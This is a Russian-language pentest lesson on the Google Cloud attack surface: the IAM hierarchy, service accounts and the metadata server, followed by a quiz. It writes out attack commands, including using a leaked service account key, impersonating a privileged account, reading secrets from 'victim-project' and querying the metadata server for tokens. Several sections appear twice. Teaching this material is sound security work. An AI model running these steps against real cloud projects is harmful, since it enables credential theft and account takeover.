---
id: cloud-gcp-basics
title: "GCP: проекты, IAM и сервисные аккаунты — поверхность атаки"
category: cloud
parent: cloud-foundations-providers
difficulty: medium
order: 2
tags: [cloud, gcp, google-cloud, iam, service-account, metadata, recon]
prerequisites: [cloud-fundamentals]
useful_for:
  - "Пентест Google Cloud Platform"
  - "Понимание IAM и service accounts в GCP"
  - "Анализ утёкших сервисных ключей"
estimated_minutes: 35
summary: "Как устроен GCP: организация, папки, проекты, IAM-политики с наследованием, сервисные аккаунты и metadata-сервер. Первые команды разведки и карта поверхности атаки."
---

## Зачем этот урок

Google Cloud Platform (GCP) устроен вокруг **проектов** и **IAM-политик**, которые наследуются вниз по иерархии. Аутентификация программируемого доступа почти всегда идёт через **сервисные аккаунты (service accounts)** — их JSON-ключи часто утекают в репозитории и CI. Понимание этой модели — обязательное условие для атаки на GCP.

## Иерархия ресурсов

```
Organization                     ← корень (если есть Google Workspace/Cloud Identity)
 └─ Folder                       ← группировка проектов
     └─ Project                 ← основная единица (биллинг, ресурсы, IAM)
         └─ Resource            ← VM, GCS bucket, Cloud SQL, ...
```

IAM-политика назначается на любой уровень и **наследуется вниз**. Роль на Organization действует на все проекты. Роль на Folder — на все проекты внутри. Это та же ловушка, что в Azure Management Group.

Ключевые понятия:

| GCP | AWS | Комментарий |
|-----|-----|-------------|
| Project | Account | Основная единица |
| IAM policy (allow) | IAM policy | Набор привязок role→member |
| Service account | IAM User / Instance Profile | «Робот», имеет email |
| Service account key (JSON) | Access key | Файл с private key |
| Cloud Storage (GCS) | S3 | Объектное хранилище |
| Metadata server | IMDS | `metadata.google.internal` |
| Workload Identity | Instance profile | Привязка SA к ресурсу |

## IAM: привязки роль → участник

Политика GCP — это список **bindings**: каждая связывает одну роль с набором **members**. Members бывают:

- `user:alice@example.com`
- `group:eng@example.com`
- `serviceAccount:sa@project.iam.gserviceaccount.com`
- `allAuthenticatedUsers`, `allUsers` — **публичный доступ** (тревожный признак).
- `domain:example.com`, `principalSet://...` (для Workload Identity).

Роли:

- **Basic** (`roles/owner`, `roles/editor`, `roles/viewer`) — грубые, опасные. `owner` = полный контроль проекта.
- **Predefined** (`roles/storage.objectViewer`, `roles/iam.serviceAccountTokenCreator`, `roles/compute.instanceAdmin`).
- **Custom** — собственные.

**Главный приём**: роль `roles/iam.serviceAccountTokenCreator` позволяет **выпустить токен от имени** любого сервисного аккаунта, к которому она применена. А `roles/iam.serviceAccountUser` — запускать ресурсы (например, Compute) под этим SA. Комбинация ведёт к полному захвату.

## Сервисные аккаунты

SA — это идентичность с email `<name>@<project>.iam.gserviceaccount.com`. Способы использования:

1. **JSON-ключ** (долгоживущий, самый опасный при утечке).
2. **Impersonation** через API (короткоживущий токен, требует прав).
3. **Привязка к ресурсу** (Compute instance, Cloud Run, GKE) — аналог instance profile.

Утёкший JSON-ключ аутентифицирует вас как SA:

```bash
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud config set project <PROJECT_ID>
```

## Metadata-сервер GCP

Внутри GCP-ресурса доступен metadata-сервер, но у него **свой API**:

```bash
# Заголовок обязателен
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Ответ — токен доступа для привязанного SA:

```json
{"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
```

Важно: в GCP есть **legacy endpoint** `http://metadata.google.internal/computeMetadata/v1/...` и версия с `?recursive=true`, отдающая сразу всю структуру. Заголовок `Metadata-Flavor: Google` — обязателен (как `Metadata: true` в Azure).

## Инструменты и первые команды

```bash
# gcloud CLI
curl -sSL https://sdk.cloud.google.com | bash
gcloud auth login
gcloud auth activate-service-account --key-file=key.json

# Кто мы
gcloud auth list
gcloud config list
gcloud projects list

# Ресурсы
gcloud compute instances list
gcloud storage buckets list
gcloud sql instances list
gcloud secrets list

# IAM
gcloud projects get-iam-policy <PROJECT_ID>
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account <SA_EMAIL>
```

Оффенсивные инструменты:

- **gcloud + gcp_scanner** — инвентаризация ресурсов.
- **ScoutSuite** — аудит мисконфигов GCP.
- **gcpwn** (модульная атака) — enumeration, privesc, persistence.
- **Hayat / GCP-IAM-Exploitation** — поиск путей эскалации по IAM.

## Разобранный пример: утёкший ключ → полный проект

1. В публичном репозитории найден `sa-key.json`.
2. Активируем и смотрим проект:
   ```bash
   gcloud auth activate-service-account --key-file=sa-key.json
   gcloud config set project victim-project
   ```
3. Проверяем права SA:
   ```bash
   gcloud projects get-iam-policy victim-project \
     --flatten="bindings[].members" \
     --filter="bindings.members:$(gcloud config get-value account)" \
     --format="table(bindings.role)"
   ```
4. Если есть `roles/iam.serviceAccountTokenCreator` — имперсонируем более привилегированный SA:
   ```bash
   gcloud auth print-access-token --impersonate-service-account=admin-sa@victim-project.iam.gserviceaccount.com
   ```
5. Читаем секреты:
   ```bash
   gcloud secrets versions access latest --secret=db-password --project=victim-project
   ```
6. Эскалация: если есть `roles/compute.instanceAdmin` — создаём VM с SA и выполняем код, либо через `roles/iam.serviceAccountUser` запускаем существующий ресурс под админским SA.

## Частые ошибки

- **Путать `allUsers` и `allAuthenticatedUsers`.** Первый — вообще без аутентификации (публичный бакет), второй — любой Google-аккаунт.
- **Не проверять наследование.** Роль на Organization/Folder не видна в `get-iam-policy` проекта — проверяйте уровень выше.
- **Считать SA-ключ «просто ключом».** Долгоживущий ключ не истекает, пока его не отзовут; это идеальная персистентность.
- **Забыть про impersonation.** Иногда прав на данные нет, но есть `TokenCreator` — и этого достаточно.
- **Игнорировать Workload Identity Federation.** `principalSet://` привязки могут открывать доступ из внешних IdP.

## Metadata-сервер GCP

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
```

Заголовок `Metadata-Flavor: Google` обязателен — это базовая защита от SSRF (но обходится, если приложение передаёт заголовки).

## Инструменты

```bash
gcloud auth list
gcloud projects list
gcloud config get-value project
gcloud iam service-accounts list
gcloud projects get-iam-policy proj --format=json
gcloud compute instances list
gcloud storage buckets list
```

## Разобранный пример 2: утёкший ключ SA

1. Находим JSON-ключ SA (в репо/бакете).
2. `gcloud auth activate-service-account --key-file=key.json`.
3. `gcloud auth list` → активен SA.
4. `gcloud projects get-iam-policy` → определяем роли SA.
5. Если editor/owner — создаём свой ключ или имперсонируем другие SA.
6. Двигаемся к данным (GCS, BigQuery, Secret Manager).

## Практическое задание

Создайте SA с ролью `storage.objectViewer`, скачайте ключ, активируйте, прочитайте бакет. Затем выдайте SA `roles/editor` и покажите, как расширяются возможности. Это базовый цикл работы с утёкшим ключом GCP.

## Иерархия и наследование

Организация → папки → проекты → ресурсы. Права, выданные выше, наследуются вниз. Поэтому `roles/owner` на организации — контроль над всем, а `roles/editor` на проекте — почти owner. Проверяйте всю цепочку:

```bash
gcloud projects get-ancestors proj
gcloud organizations get-iam-policy ORG --format=json | jq '.bindings[]'
```

Частая ошибка — смотреть только проект и не замечать права сверху.

## Итог

GCP-поверхность: ключи сервисных аккаунтов, имперсонация, metadata-сервер и наследование прав по иерархии. Утёкший ключ или SSRF к metadata часто ведут к полному проекту. Аудируйте bindings на всех уровнях и заменяйте ключи на Workload Identity.

## Первые команды разведки

```bash
gcloud auth list
gcloud projects list
gcloud iam service-accounts list
gcloud compute instances list
gcloud storage buckets list
gcloud projects get-iam-policy $PROJECT --format=json
```

Начните с `auth list` (кто вы) и `get-iam-policy` (что можете). Затем — ресурсы. Так вы быстро строите карту доступа и находите избыточные права без лишнего шума.

## Квиз

```quiz
- question: "Какая роль GCP позволяет выпустить токен от имени сервисного аккаунта?"
  options:
    - "roles/viewer"
    - "roles/iam.serviceAccountTokenCreator"
    - "roles/storage.objectViewer"
    - "roles/editor"
  answer: 1
  explanation: "TokenCreator разрешает имперсонацию сервисного аккаунта — выпуск токенов от его имени."
- question: "Какой заголовок обязателен для запроса к metadata-серверу GCP?"
  options:
    - "Metadata: true"
    - "Metadata-Flavor: Google"
    - "Authorization: Bearer"
    - "X-Google-Token"
  answer: 1
  explanation: "GCP требует Metadata-Flavor: Google (в отличие от Metadata: true в Azure)."
- question: "Что означает member allUsers в IAM-политике GCP?"
  options:
    - "Любой аутентифицированный Google-аккаунт"
    - "Полностью публичный доступ без аутентификации"
    - "Только сотрудники организации"
    - "Все сервисные аккаунты проекта"
  answer: 1
  explanation: "allUsers — публичный доступ; allAuthenticatedUsers — любой аутентифицированный аккаунт."
- question: "Где назначается IAM-политика, если роль действует на все проекты организации?"
  options:
    - "На каждом проекте отдельно"
    - "На уровне Organization или Folder, с наследованием вниз"
    - "В GCS bucket"
    - "В файле /etc/iam"
  answer: 1
  explanation: "Политики наследуются вниз по иерархии Organization → Folder → Project."
- question: "Почему JSON-ключ сервисного аккаунта особенно опасен при утечке?"
  options:
    - "Он быстро истекает"
    - "Он долгоживущий и не истекает, пока его не отзовут вручную"
    - "Он даёт только чтение"
    - "Он работает только из GCP"
  answer: 1
  explanation: "SA-ключи не имеют срока автоматического истечения — идеальная персистентность для атакующего."
```

## Где пригодится

- **Пентест GCP** — базовая карта модели IAM и service accounts.
- **Bug bounty** — программы Google и компаний на GCP.
- **IR/Blue team** — детект аномальной имперсонации и чтения секретов.
- **DevSecOps** — запрет долгоживущих SA-ключей, переход на Workload Identity.
- **Сертификации** — Google Professional Cloud Security Engineer.
